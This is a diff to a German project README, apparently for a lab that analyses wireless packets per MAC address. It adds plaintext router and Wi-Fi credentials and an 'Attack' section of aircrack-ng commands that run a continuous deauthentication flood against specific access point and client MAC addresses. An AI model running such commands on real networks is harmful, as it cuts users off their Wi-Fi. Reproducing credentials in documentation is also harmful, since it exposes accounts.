@@ -10,6 +10,16 @@
 - Bar-Chart (MAC-Adresse x # Packete absolut)
 - Bar-Chart (MAC-Adresse x # Packete normalisiert)
 
+# Zugangsdaten
+## Router
+- Web-UI: root:supersecurepassword
+- WLAN: DancingRainbows:supersecurepassword
+
+# Attack
+`airmon-ng start wlan0`
+`airodump-ng wlan0`
+`aireplay-ng -0 0 -a B8:27:EB:AC:05:0F -c 30:4B:07:ED:E3:8F wlan0`
+
 # Python
 ## Install requirements
 `pip install -r requirements.txt`
